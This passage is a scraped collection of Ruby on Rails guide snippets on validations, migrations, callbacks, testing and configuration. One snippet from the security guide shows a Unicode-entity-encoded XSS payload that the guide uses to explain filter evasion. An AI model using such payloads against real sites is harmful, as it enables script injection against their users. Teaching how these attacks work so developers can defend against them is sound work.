Fields in Rails (Ruby)\nDESCRIPTION: Shows recommended ways to validate the presence of a boolean field in Rails. Since `false.blank?` is true, simple presence validation is insufficient. Using `inclusion: [true, false]` or `exclusion: [nil]` ensures the value is explicitly true or false, preventing NULL values in the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\n# Value _must_ be true or false\nvalidates :boolean_field_name, inclusion: [true, false]\n# Value _must not_ be nil, aka true or false\nvalidates :boolean_field_name, exclusion: [nil]\n```\n\n----------------------------------------\n\nTITLE: Formatting a CHANGELOG Entry in Markdown\nDESCRIPTION: Provides an example format for entries in the Rails CHANGELOG files. It includes a summary bullet point, optional multi-line descriptions, indented code examples, reference to a related issue number (e.g., `Fixes #1234`), and the author's name in italics.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_32\n\nLANGUAGE: markdown\nCODE:\n```\n*   Summary of a change that briefly describes what was changed. You can use multiple\n    lines and wrap them at around 80 characters. Code examples are ok, too, if needed:\n\n        class Foo\n          def bar\n            puts 'baz'\n          end\n        end\n\n    You can continue after the code example, and you can attach the issue number.\n\n    Fixes #1234.\n\n    *Your Name*\n```\n\n----------------------------------------\n\nTITLE: Creating a New Rails 3.1 Application\nDESCRIPTION: Command-line instructions for creating a new Rails 3.1 application using the rails new command and changing into the application directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n# You should have the 'rails' RubyGem installed\n$ rails new myapp\n$ cd myapp\n```\n\n----------------------------------------\n\nTITLE: Configuring Autoloading for lib Directory with Ignored Subdirectories - Ruby on Rails - Ruby\nDESCRIPTION: Shows how to configure Rails' autoloading paths to include the 'lib' directory, while excluding specified subdirectories such as 'assets', 'tasks', and 'generators'. This improves code organization and prevents autoloading unwanted directories. Used in 'config/application.rb' or environment-specific configuration files.\n\n- Dependencies: Rails >= 7.1\n- Parameters: ignore (array of subdirectories)\n- Input: list of subdirs to ignore\n- Output: expanded autoload paths excluding specified folders.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.autoload_lib(ignore: %w(assets tasks generators))\n```\n\n----------------------------------------\n\nTITLE: Example of Predicate Method Documentation\nDESCRIPTION: Demonstrates thorough documentation for a boolean predicate method, showing how to describe the behavior without committing to specific return values. The example explains the method's behavior in different contexts.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\n# Returns true if the collection is empty.\n#\n# If the collection has been loaded it is equivalent to\n# +collection.size.zero?+. If the collection has not been loaded,\n# it is equivalent to +!collection.exists?+. If the collection has\n# not already been loaded and you are going to fetch the records\n# anyway, it is better to check +collection.length.zero?+.\ndef empty?\n  if loaded?\n    size.zero?\n  else\n    @target.blank? && !scope.exists?\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers with Precision using number_with_precision in Ruby\nDESCRIPTION: Shows how to use the number_with_precision helper to format a number with a specified level of precision.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nnumber_with_precision(111.2345)               # => 111.235\nnumber_with_precision(111.2345, precision: 2) # => 111.23\n```\n\n----------------------------------------\n\nTITLE: Removing Scoping with unscoped in Rails with all\nDESCRIPTION: The `unscoped` method removes all scoping, including `default_scope`, from a query. It allows executing a normal query on the table, ignoring any predefined scopes. This snippet demonstrates how to use `unscoped` with and without a block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_170\n\nLANGUAGE: ruby\nCODE:\n```\nBook.unscoped.all\n```\n\n----------------------------------------\n\nTITLE: Beginning and End of Minute Calculations in Ruby\nDESCRIPTION: The `beginning_of_minute` method returns a timestamp at the start of the minute (hh:mm:00), while `end_of_minute` provides a timestamp at the end of the minute (hh:mm:59). These methods operate on DateTime objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_157\n\nLANGUAGE: ruby\nCODE:\n```\ndate = DateTime.new(2010, 6, 7, 19, 55, 25)\ndate.beginning_of_minute # => Mon Jun 07 19:55:00 +0200 2010\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndate = DateTime.new(2010, 6, 7, 19, 55, 25)\ndate.end_of_minute # => Mon Jun 07 19:55:59 +0200 2010\n```\n\n----------------------------------------\n\nTITLE: Basic Initializer Generator Implementation\nDESCRIPTION: Simple Ruby generator class that creates an initializer file in config/initializers\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclass InitializerGenerator < Rails::Generators::Base\n  def create_initializer_file\n    create_file \"config/initializers/initializer.rb\", <<~RUBY\n      # Add initialization content here\n    RUBY\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Query Cache Size for MySQL (YAML)\nDESCRIPTION: This YAML snippet configures the query cache size for MySQL in the development environment.  This configures the query_cache to a specific number, setting the maximum number of queries to store in memory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_99\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: mysql2\n  query_cache: 200\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial with Implicit Local Assignment in Rails (Ruby)\nDESCRIPTION: This Ruby snippet demonstrates a now-deprecated approach of rendering a partial within a Rails controller action, implicitly assigning an instance variable (@customer) which was previously also made accessible as a local variable to the partial. The modern Rails approach requires explicitly passing locals via the :locals option when calling render. This relies on Rails' ActionController and the existence of a 'customer' partial. The snippet's key parameter is the :partial option, with its input being an instance of Customer; output is the rendered partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ndef partial_with_implicit_local_assignment\\n  @customer = Customer.new(\"Marcel\")\\n  render :partial => \"customer\"\\nend\n```\n\n----------------------------------------\n\nTITLE: Recurring task configuration using YAML\nDESCRIPTION: This YAML configuration defines recurring tasks, including a job (`MyJob`) and a command (`DeletedStuff.clear_all`), with specified schedules and arguments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  a_periodic_job:\n    class: MyJob\n    args: [42, { status: \"custom_status\" }]\n    schedule: every second\n  a_cleanup_task:\n    command: \"DeletedStuff.clear_all\"\n    schedule: every day at 9am\n```\n\n----------------------------------------\n\nTITLE: Qmail Ingress command line setup\nDESCRIPTION: This command pipes inbound emails to the Action Mailbox Qmail ingress, providing the URL of the relay ingress and the ingress password.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_10\n\nLANGUAGE: Bash\nCODE:\n```\n$ bin/rails action_mailbox:ingress:qmail URL=https://example.com/rails/action_mailbox/relay/inbound_emails INGRESS_PASSWORD=...\n```\n\n----------------------------------------\n\nTITLE: Loading Grouped Active Support Core Extensions\nDESCRIPTION: This snippet demonstrates how to load all extensions for a specific Ruby class, such as `Hash`. This approach loads all the extensions defined under the corresponding `active_support/core_ext/some_class` directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"active_support\"\nrequire \"active_support/core_ext/hash\"\n```\n\n----------------------------------------\n\nTITLE: Testing Parameterized Mailer Enqueueing (Alternative) (Ruby)\nDESCRIPTION: This example shows an alternative way to test that a parameterized mailer has been enqueued with the correct parameters. It passes the parameterized mailer instance directly to `assert_enqueued_email_with`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_99\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass UserMailerTest < ActionMailer::TestCase\n  test \"invite\" do\n    # Create the email and store it for further assertions\n    email = UserMailer.with(to: \"friend@example.com\").create_invite\n\n    # Test that the email got enqueued with the correct mailer parameters\n    assert_enqueued_email_with UserMailer.with(to: \"friend@example.com\"), :create_invite do\n      email.deliver_later\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Referencing New Framework Defaults Template File\nDESCRIPTION: Indicates the filename (`new_framework_defaults_8_1.rb.tt`) where new framework default configurations should be added (typically as commented-out lines). This template file is used during application generation or upgrade processes to inform users about new defaults.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\n# new_framework_defaults_8_1.rb.tt\n```\n\n----------------------------------------\n\nTITLE: Configuring Parameter Wrapping in Rails 3.1\nDESCRIPTION: This snippet shows how to configure parameter wrapping for JSON requests in Rails 3.1. It also disables root elements in JSON by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_108\n\nLANGUAGE: ruby\nCODE:\n```\n# Be sure to restart your server when you modify this file.\n# This file contains settings for ActionController::ParamsWrapper which\n# is enabled by default.\n\n# Enable parameter wrapping for JSON. You can disable this by setting :format to an empty array.\nActiveSupport.on_load(:action_controller) do\n  wrap_parameters format: [:json]\nend\n\n# Disable root element in JSON by default.\nActiveSupport.on_load(:active_record) do\n  self.include_root_in_json = false\nend\n```\n\n----------------------------------------\n\nTITLE: Active Record Association Example (has_many/belongs_to) Ruby\nDESCRIPTION: This example demonstrates how to define `has_many` and `belongs_to` associations between models, specifically between `Post` and `Comment`.  It showcases how Active Record automatically inverts plural associations if `config.active_record.automatically_invert_plural_associations` is enabled, preventing potentially useless queries. The code defines the `Post` model with a `has_many :comments` association and the `Comment` model with a `belongs_to :post` association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nclass Post < ApplicationRecord\n  has_many :comments\nend\n\nclass Comment < ApplicationRecord\n  belongs_to :post\nend\n```\n\n----------------------------------------\n\nTITLE: Destroying Objects in a Has and Belongs to Many Collection in Rails\nDESCRIPTION: Example of using the destroy method to remove an assembly from a part's collection, which removes records from the join table without destroying the objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\n@part.assemblies.destroy(@assembly1)\n```\n\n----------------------------------------\n\nTITLE: Updating Record with update in Rails\nDESCRIPTION: This snippet demonstrates how to update a record's attributes using the `update` method in ActiveRecord. It first finds a record by ID and then uses `update` to modify the `name` attribute. This triggers a database update and saves the changes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_26\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product = Product.find(1)\nstore(dev)> product.update(name: \"Shoes\")\n  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/\n  Product Update (0.3ms)  UPDATE \"products\" SET \"name\" = 'Shoes', \"updated_at\" = '2024-11-09 22:38:19.638912' WHERE \"products\".\"id\" = 1 /*application='Store'*/\n  TRANSACTION (0.4ms)  COMMIT TRANSACTION /*application='Store'*/\n=> true\n```\n\n----------------------------------------\n\nTITLE: Select Box with Default Selection in ERB\nDESCRIPTION: This ERB code demonstrates setting a default selected option in the select box.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_35\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.select :city, [[\"Berlin\", \"BE\"], [\"Chicago\", \"CHI\"], [\"Madrid\", \"MD\"]], selected: \"CHI\" %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Previewers in Ruby\nDESCRIPTION: This snippet configures the previewers used by Active Storage to generate image previews of blobs. It sets the `config.active_storage.previewers` to an array of previewer classes. Previewers are responsible for creating thumbnails of files like PDFs and videos.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.previewers = [ActiveStorage::Previewer::PopplerPDFPreviewer, ActiveStorage::Previewer::MuPDFPreviewer, ActiveStorage::Previewer::VideoPreviewer]\n```\n\n----------------------------------------\n\nTITLE: Unicode encoding attack vector example\nDESCRIPTION: An example of an XSS attack using Unicode character encoding to obfuscate malicious JavaScript. This demonstrates how attackers can bypass simple filtering mechanisms.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_46\n\nLANGUAGE: html\nCODE:\n```\n<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;\n  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\n```\n\n----------------------------------------\n\nTITLE: ActiveRecord Model Definition\nDESCRIPTION: Defines the Author model with a has_many association to Book models, ordered by publication year in descending order. This demonstrates a basic model definition with a common association pattern in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, -> { order(year_published: :desc) }\nend\n```\n\n----------------------------------------\n\nTITLE: Testing Email Enqueueing with Arguments (Ruby)\nDESCRIPTION: This test asserts that an email has been enqueued with the correct arguments using `assert_enqueued_email_with`. It creates an email using `UserMailer.create_invite` and then checks that it was enqueued with the specified arguments after calling `email.deliver_later`. It requires the `test_helper`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_96\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass UserMailerTest < ActionMailer::TestCase\n  test \"invite\" do\n    # Create the email and store it for further assertions\n    email = UserMailer.create_invite(\"me@example.com\", \"friend@example.com\")\n\n    # Test that the email got enqueued with the correct arguments\n    assert_enqueued_email_with UserMailer, :create_invite, args: [\"me@example.com\", \"friend@example.com\"] do\n      email.deliver_later\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers as Phone Numbers in Ruby\nDESCRIPTION: Demonstrates formatting numbers as phone numbers using the `to_fs(:phone)` method, including options for area code, delimiters, extensions, and country code. This is an ActiveSupport core extension to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_98\n\nLANGUAGE: ruby\nCODE:\n```\n5551234.to_fs(:phone)\n# => 555-1234\n1235551234.to_fs(:phone)\n# => 123-555-1234\n1235551234.to_fs(:phone, area_code: true)\n# => (123) 555-1234\n1235551234.to_fs(:phone, delimiter: \" \")\n# => 123 555 1234\n1235551234.to_fs(:phone, area_code: true, extension: 555)\n# => (123) 555-1234 x 555\n1235551234.to_fs(:phone, country_code: 1)\n# => +1-123-555-1234\n```\n\n----------------------------------------\n\nTITLE: Integration Test for Article Creation - Ruby\nDESCRIPTION: This Ruby code demonstrates an integration test that simulates creating a new article and verifies the results. It makes a GET request to `/articles/new`, then a POST request to `/articles` with article parameters, follows the redirect, and asserts that the response is successful and that the article content is displayed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"can create an article\" do\n  get \"/articles/new\"\n  assert_response :success\n\n  post \"/articles\",\n    params: { article: { title: \"can create\", body: \"article successfully.\" } }\n  assert_response :redirect\n  follow_redirect!\n  assert_response :success\n  assert_dom \"p\", \"Title:\\n  can create\"\nend\n```\n\n----------------------------------------\n\nTITLE: Querying a Model with Composite Primary Key - Find Method\nDESCRIPTION: This snippet shows how to use the `find` method to locate a record based on a composite primary key. An array containing the values for each part of the composite key is passed to the `find` method. The example searches for a product with `store_id` 3 and `sku` \"XYZ12345\".\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# Find the product with store_id 3 and sku \"XYZ12345\"\nirb> product = Product.find([3, \"XYZ12345\"])\n=> #<Product store_id: 3, sku: \"XYZ12345\", description: \"Yellow socks\">\n```\n\n----------------------------------------\n\nTITLE: Registering a before_validation callback with a method in Rails\nDESCRIPTION: This code snippet shows how to register a `before_validation` callback in a Rails model using a macro-style class method. The callback ensures that the `username` attribute has a value, defaulting to the `email` if it's blank.  It also validates the presence of `username` and `email`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :username, :email, presence: true\n\n  before_validation :ensure_username_has_value\n\n  private\n    def ensure_username_has_value\n      if username.blank?\n        self.username = email\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Scaffold for Models in Named Databases - Rails CLI - Bash\nDESCRIPTION: This command invokes the Rails generator to scaffold a Dog model with a name:string attribute, targeting the 'animals' database. It makes use of the --database option to ensure all related files are generated in the corresponding subdirectories. Dependencies include Rails with generators and a multi-database configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold Dog name:string --database animals\n```\n\n----------------------------------------\n\nTITLE: Migration with up/down methods\nDESCRIPTION: Defines a migration using the `up` and `down` methods to create and drop a table, create and drop a view using raw SQL, and add and remove a column. The `up` method defines schema changes, and the `down` method reverts those changes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\nclass ExampleMigration < ActiveRecord::Migration[8.1]\n  def up\n    create_table :distributors do |t|\n      t.string :zipcode\n    end\n\n    # create a distributors view\n    execute <<-SQL\n      CREATE VIEW distributors_view AS\n      SELECT id, zipcode\n      FROM distributors;\n    SQL\n\n    add_column :users, :address, :string\n  end\n\n  def down\n    remove_column :users, :address\n\n    execute <<-SQL\n      DROP VIEW distributors_view;\n    SQL\n\n    drop_table :distributors\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generated HTML Form - HTML\nDESCRIPTION: This is an example of the HTML code generated by the `form_with` helper when called without arguments. It includes the form tag, the action attribute set to the current page (/home), the method set to POST, and a hidden field containing the authenticity token.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/home\" accept-charset=\"UTF-8\" method=\"post\">\n  <input type=\"hidden\" name=\"authenticity_token\" value=\"Lz6ILqUEs2CGdDa-oz38TqcqQORavGnbGkG0CQA8zc8peOps-K7sHgFSTPSkBx89pQxh3p5zPIkjoOTiA_UWbQ\" autocomplete=\"off\">\n  Form contents\n</form>\n```\n\n----------------------------------------\n\nTITLE: Defining an after_commit Callback Object (Instance Method)\nDESCRIPTION: This code defines a callback object, `FileDestroyerCallback`, with an instance method `after_commit`. This method is called after a commit and deletes a file from the filesystem. The model `PictureFile` then uses this callback by instantiating the `FileDestroyerCallback` object and passing it to `after_commit`. The callback method receives the model object as a parameter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nclass FileDestroyerCallback\n  def after_commit(file)\n    if File.exist?(file.filepath)\n      File.delete(file.filepath)\n    end\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass PictureFile < ApplicationRecord\n  after_commit FileDestroyerCallback.new\nend\n```\n\n----------------------------------------\n\nTITLE: Strictly Creating Associated Object with Exception on Validation Failure - Ruby\nDESCRIPTION: Attempts to create and save a new Author for a Book. If validations fail, raises ActiveRecord::RecordInvalid. The block demonstrates exception handling using begin/rescue. Requires ActiveRecord and proper model setup. Useful for surfacing validation errors directly.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\n# This will raise ActiveRecord::RecordInvalid because the name is blank\\nbegin\\n  @book.create_author!(author_number: 123, name: \\\"\\\")\\nrescue ActiveRecord::RecordInvalid => e\\n  puts e.message\\nend\n```\n\n----------------------------------------\n\nTITLE: Console output creating new product with Product.create()\nDESCRIPTION: This code block is not code, but terminal output describing creating and saving a new product using Product.create().\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_21\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.create(name: \"Pants\")\n  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/\n  Product Create (0.4ms)  INSERT INTO \"products\" (\"name\", \"created_at\", \"updated_at\") VALUES ('Pants', '2024-11-09 16:36:01.856751', '2024-11-09 16:36:01.856751') RETURNING \"id\" /*application='Store'*/\n  TRANSACTION (0.1ms)  COMMIT TRANSACTION /*application='Store'*/\n=> #<Product:0x0000000120485c80 id: 2, name: \"Pants\", created_at: \"2024-11-09 16:36:01.856751000 +0000\", updated_at: \"2024-11-09 16:36:01.856751000 +0000\">\n```\n\n----------------------------------------\n\nTITLE: Rejecting Empty Nested Attributes in Rails (Ruby)\nDESCRIPTION: This code snippet demonstrates how to prevent empty records from being created when using nested attributes in Rails. It uses the `:reject_if` option with a lambda to check if the 'kind' attribute is blank. If it is, the associated address record will not be built.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_86\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  has_many :addresses\n  accepts_nested_attributes_for :addresses, reject_if: lambda { |attributes| attributes[\"kind\"].blank? }\nend\n```\n\n----------------------------------------\n\nTITLE: Calculating Years Since using years_since in Ruby\nDESCRIPTION: The `years_since` method calculates a date in the future by a specified number of years.  It takes an integer representing the number of years to add to the given date and returns the resulting date. If the resulting date is invalid (e.g., February 29th of a non-leap year), it returns the last day of the corresponding month.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_149\n\nLANGUAGE: ruby\nCODE:\n```\ndate = Date.new(2010, 6, 7)\ndate.years_since(10) # => Sun, 07 Jun 2020\n```\n\n----------------------------------------\n\nTITLE: Creating a Table with Composite Primary Key - Rails Migration\nDESCRIPTION: This snippet demonstrates how to create a table with a composite primary key in a Rails migration using the `create_table` method with the `:primary_key` option set to an array of column names. The `store_id` (integer) and `sku` (string) columns are specified as part of the composite primary key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateProducts < ActiveRecord::Migration[8.1]\n  def change\n    create_table :products, primary_key: [:store_id, :sku] do |t|\n      t.integer :store_id\n      t.string :sku\n      t.text :description\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Halting Callback Execution in Rails\nDESCRIPTION: This example shows how to halt the execution of a callback chain in Rails using `throw :abort`.  When `throw :abort` is called within a callback, the transaction is rolled back, and the `create` method returns `false`.  Exceptions are re-raised unless it is an `ActiveRecord::Rollback` or `ActiveRecord::RecordInvalid` exception.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ActiveRecord::Base\n  before_validation do\n    throw :abort if total_price < 0\n  end\nend\n\nProduct.create # => false\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  before_destroy do\n    throw :abort if still_active?\n  end\nend\n\nUser.first.destroy # => false\n```\n\n----------------------------------------\n\nTITLE: Specifying Conditions on Joined Tables with Hash in Rails\nDESCRIPTION: This snippet demonstrates how to specify conditions for joined tables using nested hash conditions with the `where` method. It retrieves all `Customer` objects who have `orders` created within a specific time range, providing a cleaner syntax compared to using a raw string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_144\n\nLANGUAGE: ruby\nCODE:\n```\ntime_range = (Time.now.midnight - 1.day)..Time.now.midnight\nCustomer.joins(:orders).where(orders: { created_at: time_range }).distinct\n```\n\n----------------------------------------\n\nTITLE: Enqueuing a job with a delayed execution time\nDESCRIPTION: This code enqueues the `GuestsCleanupJob` to be performed at a specific time in the future (tomorrow at noon). It uses the `set` method to specify the `wait_until` option, which takes a `DateTime` object. The `perform_later` method then enqueues the job with the specified delay, passing the `guest` object as an argument.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# Enqueue a job to be performed tomorrow at noon.\nGuestsCleanupJob.set(wait_until: Date.tomorrow.noon).perform_later(guest)\n```\n\n----------------------------------------\n\nTITLE: Conditional Sizing Based on local_assigns in Rails\nDESCRIPTION: This example showcases how `local_assigns` can be used to conditionally set the size of an image. It uses `local_assigns[:in_gallery]` to determine whether the image should be resized to `[800, 600]` or `[1024, 768]` when rendering a blob representation from Active Storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_17\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= image_tag blob.representation(resize_to_limit: local_assigns[:in_gallery] ? [ 800, 600 ] : [ 1024, 768 ]) %>\n```\n\n----------------------------------------\n\nTITLE: Checking object existence with any? and many? in Rails\nDESCRIPTION: Shows how to use `any?` and `many?` to check for the existence of records based on different conditions. `many?` uses SQL `count` to determine existence.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_202\n\nLANGUAGE: ruby\nCODE:\n```\n# via a model\nOrder.any?\n# SELECT 1 FROM orders LIMIT 1\nOrder.many?\n# SELECT COUNT(*) FROM (SELECT 1 FROM orders LIMIT 2)\n\n# via a named scope\nOrder.shipped.any?\n# SELECT 1 FROM orders WHERE orders.status = 0 LIMIT 1\nOrder.shipped.many?\n# SELECT COUNT(*) FROM (SELECT 1 FROM orders WHERE orders.status = 0 LIMIT 2)\n\n# via a relation\nBook.where(out_of_print: true).any?\nBook.where(out_of_print: true).many?\n\n# via an association\nCustomer.first.orders.any?\nCustomer.first.orders.many?\n```\n\n----------------------------------------\n\nTITLE: Registering callbacks to fire on specific life cycle events in Rails\nDESCRIPTION: This code snippet demonstrates how to register callbacks to fire only on specific life cycle events using the `:on` option. The `ensure_username_has_value` callback is triggered only on `:create`, and the `set_location` callback is triggered on both `:create` and `:update`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  validates :username, :email, presence: true\n\n  before_validation :ensure_username_has_value, on: :create\n\n  # :on takes an array as well\n  after_validation :set_location, on: [ :create, :update ]\n\n  private\n    def ensure_username_has_value\n      if username.blank?\n        self.username = email\n      end\n    end\n\n    def set_location\n      self.location = LocationService.query(self)\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Setup and Teardown Methods for Tests - Ruby\nDESCRIPTION: This Ruby code snippet demonstrates the use of `setup` and `teardown` methods in a test class. The `setup` method is called before each test and initializes an instance variable `@article`. The `teardown` method is called after each test and clears the Rails cache. This helps to DRY up the tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ArticlesControllerTest < ActionDispatch::IntegrationTest\n  # called before every single test\n  setup do\n    @article = articles(:one)\n  end\n\n  # called after every single test\n  teardown do\n    # when controller is using cache it may be a good idea to reset it afterwards\n    Rails.cache.clear\n  end\n\n  test \"should show article\" do\n    # Reuse the @article instance variable from setup\n    get article_url(@article)\n    assert_response :success\n  end\n\n  test \"should destroy article\" do\n    assert_difference(\"Article.count\", -1) do\n      delete article_url(@article)\n    end\n\n    assert_redirected_to articles_path\n  end\n\n  test \"should update article\" do\n    patch article_url(@article), params: { article: { title: \"updated\" } }\n\n    assert_redirected_to article_path(@article)\n    # Reload association to fetch updated data and assert that title is updated.\n    @article.reload\n    assert_equal \"updated\", @article.title\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: YJIT Configuration in Ruby on Rails\nDESCRIPTION: Shows how to disable YJIT compiler in Rails 7.2 applications running on Ruby 3.3+.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_2_release_notes.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.yjit = false\n```\n\n----------------------------------------\n\nTITLE: Bulk Translation Lookup\nDESCRIPTION: Demonstrates looking up multiple translations at once and handling nested translations\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.t [:odd, :even], scope: \"errors.messages\"\nI18n.t \"errors.messages\"\n```\n\n----------------------------------------\n\nTITLE: Rewritten API URL for Edge Guides - none\nDESCRIPTION: Presents a rewritten API URL pointing to the edge API documentation, illustrating the guides generator’s behavior for edge builds. It's used illustratively within documentation; no dependencies or outputs beyond link usage in documentation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_8\n\nLANGUAGE: none\nCODE:\n```\nhttps://edgeapi.rubyonrails.org/classes/ActionDispatch/Response.html\n```\n\n----------------------------------------\n\nTITLE: Example of Short Code Example Format in Documentation\nDESCRIPTION: Shows how to format brief code examples in documentation without requiring explicit \"Examples\" labels. The examples demonstrate how to display results with the `# =>` convention.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n# Converts a collection of elements into a formatted string by\n# calling 